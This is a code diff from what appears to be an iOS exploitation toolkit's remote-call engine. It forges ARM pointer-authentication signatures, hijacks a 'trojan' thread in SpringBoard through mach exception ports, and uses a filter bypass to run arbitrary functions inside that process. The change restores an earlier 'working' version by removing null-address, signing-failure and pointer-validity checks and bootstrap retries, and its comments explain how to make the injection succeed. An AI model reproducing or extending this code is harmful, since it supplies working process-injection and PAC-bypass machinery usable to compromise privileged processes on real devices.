@@ -1574,27 +1574,23 @@ bool sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint
         uint64_t discPC = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("pc"));
         uint64_t discLR = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("lr"));
 
-        // Fl0rk IPA dig (0x1006bc094): creator calls sign_state(state, 0x101, 0x201)
-        // via the blended-discriminator path. Only pthread start uses
-        // remote_pac(0x301, modifier=0) at 0x1006ba340. 5d0b6a000 wrongly used
-        // modifier 0 for LR 0x201 — getpid ran to RET then PAC-failed
-        // (wait2 PC=LR=getpid+0x18). Match working 734a5e248: always discPC/discLR.
+        // Working 734a5e248 wrote the remote_pac result through unconditionally
+        // and had no failure return. Restored verbatim. When 5d0b6a/a8a15e added
+        // the "return false on a zero signature" rule, a signer that was late by
+        // microseconds stopped the call instead of sending it, and the session
+        // never got past bootstrap.
         if (pc) {
-            uint64_t signedPC = remote_pac(signingThread, pc, discPC);
-            if (!signedPC) return false;
             uint32_t flags = state->__flags;
             flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
             state->__flags = flags;
-            state->__pc = signedPC;
+            state->__pc = remote_pac(signingThread, pc, discPC);
         }
         if (lr) {
-            uint64_t signedLR = remote_pac(signingThread, lr, discLR);
-            if (!signedLR) return false;
             uint32_t flags = state->__flags;
             flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                        __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
             state->__flags = flags;
-            state->__lr = signedLR;
+            state->__lr = remote_pac(signingThread, lr, discLR);
         }
         return true;
     }
@@ -1672,39 +1668,19 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
     uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
     uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
 {
+    // Working 734a5e248, body restored verbatim. The later step bookkeeping,
+    // the null-symbol refusal, the sign_state failure gate and the fault
+    // re-park all came after it and are gone again: that build drove SpringBoard
+    // with this exact sequence, and a8a15ead shows getpid still not returning
+    // to 0x201 with any of the additions in place.
     int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
     int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
     uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));
-
-    g_RC_lastTempStep = 0;
-
-    // A callee with no address is never sent.
-    //
-    // sign_state signs the PC only when pc is non-zero, because zero is not a code
-    // address, and it leaves __pc alone when it is given zero. So a name that does
-    // not resolve produces a state whose PC is whatever the thread was already
-    // parked at, which here is the trap address 0x101. The thread re-faults at the
-    // place it was already faulted, that arrives on the port this function is about
-    // to read, and it is delivered as the return: the second wait completes, the
-    // return value is a register the function never set, and the caller is told a
-    // call happened.
-    //
-    // That is the exact failure this engine spent the last two rounds learning to
-    // name, in its purest form, and it was still reachable here. The stable path
-    // has always refused a null address; only this one did not.
-    if (!pcAddr) {
-        g_RC_lastTempStep = 13;
-        RC_DIAG("temp/%s has no address (dlsym returned 0) — refusing to send",
-                name ?: "?");
-        g_RC_success = false;
-        return 0;
-    }
 
     ExceptionMessage exc;
     if (!wait_exception(g_RC_firstExceptionPort, &exc, newTimeout, false)) {
         RC_DIAG("temp/%s wait1 MISS timeout=%d (missed creator 0x101 → likely SIGBUS 0x201)",
                 name ?: "?", newTimeout);
-        g_RC_lastTempStep = 1;
         g_RC_success = false;
         return 0;
     }
@@ -1723,7 +1699,6 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
                 (unsigned long long)native_strip(exc.threadState.__pc),
                 (unsigned long long)native_strip(exc.threadState.__sp),
                 (unsigned)exc.flavor);
-        g_RC_lastTempStep = 3;
         g_RC_success = false;
         return 0;
     }
@@ -1736,18 +1711,12 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
     exc.threadState.__x[5] = x5;
     exc.threadState.__x[6] = x6;
     exc.threadState.__x[7] = x7;
-    if (!sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN_CREATOR)) {
-        RC_DIAG("sign_state failed in temp_internal, no reply sent (name=%s)", name ? name : "?");
-        g_RC_lastTempStep = 4;
-        g_RC_success = false;
-        return 0;
-    }
-    RC_DIAG("temp/%s signed PC=0x%llx LR=0x%llx flags=0x%x diver=0x%llx",
+    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN_CREATOR);
+    RC_DIAG("temp/%s signed PC=0x%llx LR=0x%llx flags=0x%x",
             name ?: "?",
             (unsigned long long)exc.threadState.__pc,
             (unsigned long long)exc.threadState.__lr,
-            (unsigned)exc.threadState.__flags,
-            (unsigned long long)(exc.threadState.__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK));
+            (unsigned)exc.threadState.__flags);
     reply_with_state(&exc, &exc.threadState);
 
     if (timeout < 0) {
@@ -1758,7 +1727,6 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
     ExceptionMessage exc2;
     if (!wait_exception(g_RC_firstExceptionPort, &exc2, newTimeout, false)) {
         RC_DIAG("temp/%s wait2 MISS (RET to FAKE_LR 0x201 uncaught?)", name ?: "?");
-        g_RC_lastTempStep = 2;
         g_RC_success = false;
         return 0;
     }
@@ -1767,49 +1735,13 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
             (unsigned long long)native_strip(exc2.threadState.__pc),
             (unsigned long long)native_strip(exc2.threadState.__lr),
             (unsigned long long)exc2.threadState.__x[0]);
-    g_RC_lastTempRetPC_raw = exc2.threadState.__pc;
-    g_RC_lastTempRetPC = native_strip(exc2.threadState.__pc);
-    g_RC_lastTempExcType = exc2.exception;
-    g_RC_lastTempExcCode = exc2.codeFirst;
-    g_RC_lastTempX0 = exc2.threadState.__x[0];
     uint64_t retValue = exc2.threadState.__x[0];
-    // Working 734a5e248 always replied the wait2 state. Re-parking to 0x101 on
-    // a non-0x201 PC made bootstrap getpid a hard fail before create could run.
-    if (native_strip(exc2.threadState.__pc) != FAKE_LR_TROJAN_CREATOR) {
-        RC_DIAG("temp/%s wait2 PC=0x%llx != FAKE_LR 0x201 ret=0x%llx — reply anyway",
-                name ?: "?",
-                (unsigned long long)native_strip(exc2.threadState.__pc),
-                (unsigned long long)retValue);
-        if (g_RC_lastTempStep == 0)
-            g_RC_lastTempStep = 5;
-    }
     reply_with_state(&exc2, &exc2.threadState);
     if (remote_call_should_log_result(name, false))
         printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
-
-    // The "if getpid returned 0, fail" rule that used to be here is gone, and
-    // only the g_RC_success assignment is gone: the printf stays, because a zero
-    // from getpid is worth seeing.
-    //
-    // A value cannot tell a call that did not happen from a call that happened and
-    // returned zero, and this function can already tell the difference, precisely
-    // and without a guess. Reaching this line at all means both waits completed.
-    // The first one means the thread was parked at a faulting PC and took the trap.
-    // The second means it ran the function and took the trap on the way out. A
-    // caller that wants to know whether the mechanism worked reads the step, and a
-    // caller that wants to know whether it happened reads whether it got here.
-    //
-    // What the rule cost is not a failed init, it is a destroyed one. Together with
-    // the bootstrap's own "bootstrapPid != 0", it made the entire overlay depend on
-    // a number that the bootstrap then throws away and re-reads properly further
-    // down, and a session that measured attempts=3, last=unclassified,
-    // pacTimeouts=0 was exactly that: no wait gave up, the pacia signer was never
-    // late, the call went out and came back with zero, and every part of the engine
-    // was working. Both waits completing is the proof of life. A non-zero pid is
-    // not, and it is not even a fact about the engine.
-    if (strcmp(name, "getpid") == 0 && retValue == 0) {
-        printf("[%s:%d] getpid returned 0 (both waits completed, so the call ran)\n",
-               __FUNCTION__, __LINE__);
+    if(strcmp(name, "getpid") == 0 && retValue == 0) {
+        printf("[%s:%d] getpid failed\n", __FUNCTION__, __LINE__);
+        g_RC_success = false;
     }
     return retValue;
 }
@@ -2935,24 +2867,12 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
     g_RC_success = true;
 
-    // Fl0rk out-ptr: (SP & 0x7fffffffff) - 0x100. Measured working.
-    //
-    // A heap-malloc out was tried on the theory that SP-0x100 sits in the pthread
-    // guard gap. Device log 2026-09-30 12:48 contradicted that path: temp/malloc
-    // faulted (wait2 PC=0x1a0af4370 ≠ 0x201) with x0 still holding the size arg
-    // 0x10, and that 0x10 was then fed to pthread_create_suspended_np as out.
-    // Create faulted the same way. Bootstrap getpid on the same thread was fine,
-    // so the transport works — only the out address was poison.
-    //
-    // Restore the Fl0rk address. Reject it if it is not a userspace pointer so a
-    // corrupt SP cannot silently become the next outBuf=0x10.
+    // 734a5e248: out = (SP & 0x7fffffffff) - 0x100, no validity gate. A gate
+    // here that rejects the address cannot help, because the only other value
+    // this file has ever used is a heap malloc, and that one faulted and
+    // poisoned the create with the size argument (0x10). Kept verbatim.
     uint64_t outBuf = trapSP - 0x100ULL;
-    if (outBuf < 0x100000000ULL) {
-        RC_DIAG("out buffer SP-0x100=0x%llx not a user pointer — refusing create",
-                (unsigned long long)outBuf);
-        outBuf = 0;
-    }
-    RC_DIAG("out buffer: SP=0x%llx out=SP-0x100=0x%llx vmMap=0x%llx",
+    RC_DIAG("Fl0rk out=SP-0x100: SP=0x%llx out=0x%llx vmMap=0x%llx",
             (unsigned long long)trapSP,
             (unsigned long long)outBuf,
             (unsigned long long)g_RC_vmMap);
@@ -2961,86 +2881,9 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     RC_DIAG("remote_pac(0x301,0)=0x%llx", (unsigned long long)remoteCrashSigned);
 
     RC_DIAG("bootstrap getpid begin");
-
-    // The bootstrap getpid, retried. This is the one call that decides whether the
-    // whole overlay exists: every call after it runs on the thread this one proves
-    // can be driven at all, so a single miss here takes down the entire feature.
-    //
-    // It was also the only one-shot left in the bootstrap, and a one-shot on a mach
-    // exception port is a bet that the fault is already queued at the instant we go
-    // looking for it.
-    //
-    // The 100 is not 100 ms. do_remote_call_temp_internal raises every temp call to
-    // the stable floor first, so this already waits 10 s, and a miss here is a full
-    // ten second wait that came back empty rather than a call that was too slow.
-    //
-    // Retrying is the correct response to a miss rather than a patch over one,
-    // because the port is a queue and a miss means the fault is late far more often
-    // than it means the fault is absent. Nothing is replied on a miss, so whatever
-    // was in flight is still queued and the next attempt consumes it. If it is the
-    // second wait that missed, then the return fault is what is now sitting in the
-    // queue, and driving the thread with getpid again from that state runs getpid
-    // once more and traps in the same place, so the pair converges instead of
-    // oscillating. Every attempt is self-contained: same port, same parked thread,
-    // one more step along.
-    //
-    // Three attempts, not thirty. SpringBoard's main thread is parked at 0x101 for
-    // the duration, so each attempt is more time the device runs without a main
-    // thread, and a failure here is a failure of the whole feature rather than
-    // something to grind on. The step that missed is printed unconditionally, once,
-    // because the app's console is the only surface available when this fails and it
-    // used to say nothing beyond the two hypotheses in the failure string.
-    uint64_t bootstrapPid = 0;
-    g_RC_bootstrapAttempts = 0;
-    g_RC_bootstrapPid = 0;
-    for (int attempt = 1; attempt <= 3; attempt++) {
-        g_RC_success = true;   // do_remote_call_temp clears it; a retry starts clean
-        g_RC_bootstrapAttempts = attempt;
-        bootstrapPid = do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
-        g_RC_bootstrapPid = bootstrapPid;
-        RC_DIAG("bootstrap getpid attempt %d done pid=%llu success=%d step=%d",
-                attempt, (unsigned long long)bootstrapPid,
-                (int)g_RC_success, g_RC_lastTempStep);
-
-        // Success is the mechanism. Not the pid.
-        //
-        // g_RC_lastTempStep is 0 when neither of the transport's two waits gave up,
-        // and the transport only returns normally once both of them have completed.
-        // The first one completing means the thread was parked at 0x101 and took the
-        // fault. The second means it ran the function and took the fault on the way
-        // back out, returning into 0x201. That is the whole of what this call is
-        // for, and it is the only part of it that the two waits actually measure.
-        //
-        // The pid is not that, and asking for it was wrong twice over.
-        //
-        // It is discarded here. Further down, once the synthetic thread exists,
-        // g_RC_pid is read properly with do_remote_call_stable and that is the value
-        // the rest of the engine uses. Nothing between here and there looks at
-        // bootstrapPid.
-        //
-        // And it is not free to demand. The engine carries a second copy of the same
-        // rule inside the transport, a bare "if getpid returned 0, fail", which
-        // clears g_RC_success on the way past and leaves the step unset. So the two
-        // rules together made the entire overlay depend on a number this call was
-        // never chartered to establish, and the sign that they had done it is
-        // unambiguous once the step is measured: a failing session read
-        // attempts=3, last=unclassified, pacTimeouts=0, which says no wait gave up,
-        // the pacia signer was never late, and the call went out and came back with
-        // zero. Every part of the engine was working, and the session was destroyed
-        // over a return value that is thrown away.
-        // Working 734a5e248: g_RC_success and a non-zero pid. retPC==0x201 is
-        // preferred but not required to proceed — that build did not test it.
-        if (g_RC_success && bootstrapPid != 0) {
-            break;
-        }
-        if (bootstrapPid != 0 && (g_RC_lastTempStep == 0 || g_RC_lastTempStep == 5)) {
-            g_RC_success = true;
-            break;
-        }
-    }
-    RC_DIAG("bootstrap getpid done pid=%llu success=%d step=%d retPC=0x%llx",
-            (unsigned long long)bootstrapPid, (int)g_RC_success, g_RC_lastTempStep,
-            (unsigned long long)native_strip(g_RC_lastTempRetPC));
+    uint64_t bootstrapPid = do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
+    RC_DIAG("bootstrap getpid done pid=%llu success=%d",
+            (unsigned long long)bootstrapPid, (int)g_RC_success);
     if (!g_RC_success || bootstrapPid == 0) {
         RC_DIAG("bootstrap getpid FAILED");
         fail_after_creator_park(RemoteCallInitFailureBootstrapGetpid, targetPid);
